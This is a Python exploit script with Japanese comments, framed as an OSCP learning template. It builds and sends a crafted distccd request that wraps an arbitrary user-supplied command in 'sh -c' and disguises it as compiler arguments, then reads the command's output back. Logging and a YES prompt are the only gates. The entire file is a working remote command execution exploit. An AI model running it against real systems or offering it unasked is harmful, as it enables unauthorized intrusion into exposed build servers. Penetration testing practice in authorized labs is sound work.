#!/usr/bin/env python3
# exploit_template_distcc_enhanced.py
# OSCP-oriented learning template: Metasploit-independent distccd helper
# Safe defaults: NOT sending by default; explicit --send + 'YES' prompt required.
# Use ONLY in labs you own/control and have explicit authorization to test.

import abc
import argparse
import binascii
import socket
import sys
import time
import os
import json
from datetime import datetime
from typing import Optional

DEFAULT_LOG_DIR = "logs"

# 指定ディレクトリが無ければ作成してパスを返すユーティリティ
def ensure_dir(p: str):
    os.makedirs(p, exist_ok=True)
    return p

# 現在時刻を ISO 形式で返すユーティリティ
def iso():
    return datetime.utcnow().isoformat() + "Z"

# ---------- Base class with robust logging ----------
class ExploitBase(abc.ABC):
    """
    再利用可能な基底クラス。
    - セーフモード（送信しない）をデフォルトで有効にする
    - ファイルにログ・メタ情報を書き出す
    - 1ターゲット1送信（ワンショット）を想定
    """
    # 初期化：ターゲット/ポート/タイムアウト/送信フラグ/コマンド/ログディレクトリを設定
    def __init__(self, target: Optional[str], port: int, timeout: float, send: bool, show: bool, cmd: str, log_dir: str = DEFAULT_LOG_DIR):
        self.target = target                              # 対象ホストIP
        self.port = port                                  # 対象ポート
        self.timeout = timeout                            # ソケットタイムアウト秒
        self.send = send                                  # 実際に送信するかのフラグ
        self.show = show                                  # 生成を表示するかのフラグ
        self.cmd = cmd                                    # 実行させるコマンド
        self.started_at = iso()                           # セッション開始時刻
        self.session_id = self.started_at.replace(":", "_")  # セッションID（ファイル名用）
        self.log_dir = ensure_dir(log_dir)                # ログ保存ディレクトリ確保
        self.prefix = f"{self.__class__.__name__}_{self.session_id}"  # ログファイル名接頭辞
        self.proof_path = os.path.join(self.log_dir, f"{self.prefix}.log")  # 証跡ログのフルパス
        self.meta_path = os.path.join(self.log_dir, f"{self.prefix}.json")  # メタ情報ファイルのパス

        # 再現性のためのメタ情報を書き出す
        self._write_meta({
            "class": self.__class__.__name__,
            "module": type(self).__module__,
            "started_at": self.started_at,
            "target": self.target,
            "port": self.port,
            "timeout": self.timeout,
            "send": self.send,
            "show": self.show,
            "cmd": self.cmd
        })

    # --- abstract / protocol-specific ---
    @abc.abstractmethod
    def build_request(self) -> bytes:
        """プロトコル固有のメインリクエストバイト列を構築して返す（具象で実装）"""
        raise NotImplementedError

    @abc.abstractmethod
    def build_trailer(self) -> bytes:
        """プロトコル固有のトレーラ／タグ等を返す（具象で実装）"""
        raise NotImplementedError

    @abc.abstractmethod
    def parse_output(self, sock: socket.socket) -> dict:
        """ソケットからのレスポンスをパースして {'stdout':..,'stderr':..} を返す（具象で実装）"""
        raise NotImplementedError

    # --- I/O helpers ---
    # バイト列を hex 文字列に変換するユーティリティ
    def hexdump(self, b: bytes) -> str:
        return binascii.hexlify(b).decode()

    # 指定バイト数を厳密に受信するヘルパー（タイムアウトを使用）
    def _read_exact(self, sock: socket.socket, n: int) -> bytes:
        sock.settimeout(self.timeout)
        data = b""
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                break
            data += chunk
        return data

    # --- logging helpers ---
    # メタ情報を JSON で保存する内部関数
    def _write_meta(self, obj: dict):
        ensure_dir(self.log_dir)
        with open(self.meta_path, "w", encoding="utf-8") as f:
            json.dump(obj, f, indent=2, ensure_ascii=False)

    # 単一行をログに追記し、同時に標準出力にも出す
    def log_line(self, text: str):
        ensure_dir(self.log_dir)
        with open(self.proof_path, "a", encoding="utf-8") as f:
            f.write(text + "\n")
        print(text)

    # タイトルと本文をまとまってログとして出力する
    def log_block(self, title: str, body: str):
        header = f"==== {title} @ {iso()} ===="
        self.log_line(header)
        for line in body.splitlines():
            self.log_line(line)
        self.log_line("=" * len(header))

    # バイト列（ASCII 表示 + HEX 表示）をログ出力する
    def log_bytes(self, title: str, b: bytes):
        ascii_part = b.decode(errors="replace")
        hex_part = self.hexdump(b)
        body = f"[ASCII]\n{ascii_part}\n\n[HEX]\n{hex_part}\n"
        self.log_block(title, body)

    # 受け取ったテキストを行番号・タイムスタンプ付きでログ化する
    def log_lines_numbered(self, label: str, text: str):
        lines = text.splitlines()
        out_lines = [f"[{label} L{idx:03d} @ {iso()}] {line}" for idx, line in enumerate(lines, 1)]
        self.log_block(f"{label} (numbered)", "\n".join(out_lines))

    # --- network execution ---
    # 実際に1回だけ送信する処理（送信フラグが True の時のみ実行）
    def send_once(self, data: bytes, trailer: bytes):
        if not self.send:
            self.log_line("[*] SEND flag is OFF (safe mode). Not sending.")
            return None

        assert self.target, "--send requires --target"
        self.log_line(f"[!] About to send one-shot to {self.target}:{self.port}")
        confirm = input("Type EXACTLY 'YES' to proceed: ")
        if confirm != "YES":
            self.log_line("[*] Aborted by user.")
            return None

        # ソケットを開いてデータを送信し、parse_output でレスポンス処理を委譲
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(self.timeout)
            s.connect((self.target, self.port))
            s.sendall(data)
            s.sendall(trailer)
            self.log_line("[*] Request + trailer sent.")
            res = self.parse_output(s)
            return res

    # --- main orchestration ---
    # 全体の実行フロー（生成 -> ログ保存 -> 任意で送信 -> レスポンスログ）
    def run(self):
        self.log_line(f"== Session: {self.__class__.__name__} started @ {self.started_at} ==")
        req = self.build_request()            # リクエストを構築
        trailer = self.build_trailer()        # トレーラを構築

        self.log_bytes("Generated Request", req)      # 生成リクエストをログ
        self.log_bytes("Generated Trailer", trailer)  # 生成トレーラをログ

        if self.send:
            res = self.send_once(req, trailer)       # 送信してレスポンス取得
            if res is None:
                self.log_line("[*] No response (aborted/failed).")
                return
            stderr = res.get("stderr", "")
            stdout = res.get("stdout", "")
            self.log_lines_numbered("STDERR", stderr)  # stderr を行番号付きでログ
            self.log_lines_numbered("STDOUT", stdout)  # stdout を行番号付きでログ
        else:
            self.log_line("[*] Safe mode: not sending. Use --send --target <IP> (lab only).")

# SAMPLE
# ---------- Distcc concrete implementation ----------
class DistccExploit(ExploitBase):
    # Distcc 固有の組み立て・解析を行う具象クラス
    def __init__(self, target=None, port=3632, timeout=6.0, send=False, show=True, cmd="id", log_dir: str = DEFAULT_LOG_DIR):
        super().__init__(target, port, timeout, send, show, cmd, log_dir=log_dir)

    # ARGV フィールドのパック（長さ8桁HEX + データ）を作る
    def _pack_argv(self, s: str) -> bytes:
        b = s.encode()
        return ("ARGV%08x" % len(b)).encode() + b

    # リクエスト本体を構築（DIST + ARGC + ARGV...）
    def build_request(self) -> bytes:
        args = ["sh", "-c", self.cmd, "#", "-c", "main.c", "-o", "main.o"]  # コンパイル風に見せかける引数列
        out = bytearray()
        out.extend(b"DIST00000001")                                # DIST ヘッダ
        out.extend(("ARGC%08x" % len(args)).encode())              # ARGC フィールド
        for a in args:
            out.extend(self._pack_argv(a))                        # 各 ARGV を連結
        return bytes(out)

    # DOTI トレーラ（長さを 8 桁 HEX で付与してタグを追加）
    def build_trailer(self) -> bytes:
        tag = ("%s" % int(time.time()))[-10:]                      # タグ（末尾10桁）
        tb = tag.encode()
        return b"DOTI" + ("%08x" % len(tb)).encode() + tb + b"\n"

    # 4バイト(type) + 8文字(ASCII hex length) を読み取り長さを返すヘルパー
    def _read_hex_len(self, sock: socket.socket) -> Optional[int]:
        t = self._read_exact(sock, 4)  # type (ignored)  # 型フィールドを読み捨て
        if not t:
            return None
        hx = self._read_exact(sock, 8)  # ASCII hex length を取得
        if not hx:
            return None
        try:
            raw = binascii.unhexlify(hx)           # ASCII hex -> バイナリ
            return int.from_bytes(raw, "big")      # big-endian で整数化
        except Exception:
            return None

    # ソケットからの応答をパースして stdout/stderr を返す
    def parse_output(self, sock: socket.socket) -> dict:
        result = {"stderr": "", "stdout": ""}
        hdr = self._read_exact(sock, 24)                    # 最初に24バイトのヘッダを読む
        if not hdr or len(hdr) != 24:
            self.log_line("[!] No/short header (expected 24 bytes).")
            return result

        # STDERR を読む（長さを取得してからそのバイト数を受信）
        n = self._read_hex_len(sock)
        if n and n > 0:
            data = self._read_exact(sock, n)
            result["stderr"] = data.decode(errors="replace")

        # STDOUT を読む（同様に長さ→データ）
        n = self._read_hex_len(sock)
        if n and n > 0:
            data = self._read_exact(sock, n)
            result["stdout"] = data.decode(errors="replace")

        return result

# コマンドラインインターフェースの定義
def cli():
    ap = argparse.ArgumentParser(description="distccd learning template (enhanced logging). Safe mode by default.")
    ap.add_argument("--module", choices=["distcc"], default="distcc")               # サブモジュール名（現状 distcc のみ）
    ap.add_argument("--target", type=str, help="Target IP (required if --send)")  # 送信先 IP
    ap.add_argument("--port", type=int, default=3632)                              # ポート指定（デフォルト 3632）
    ap.add_argument("--timeout", type=float, default=6.0)                           # タイムアウト秒
    ap.add_argument("--send", action="store_true", help="Actually send once (LAB ONLY; prompts YES)")  # 送信フラグ
    ap.add_argument("--show", action="store_true", help="Show generated bytes (always logged)")         # 生成表示フラグ
    ap.add_argument("--cmd", type=str, default="id", help="Command for sh -c '<cmd>'")                  # 実行コマンド
    ap.add_argument("--log-dir", type=str, default=DEFAULT_LOG_DIR, help="Directory for logs")          # ログディレクトリ
    args = ap.parse_args()

    if args.module == "distcc":
        ex = DistccExploit(target=args.target, port=args.port, timeout=args.timeout,
                           send=args.send, show=args.show, cmd=args.cmd, log_dir=args.log_dir)
        ex.run()

if __name__ == "__main__":
    cli()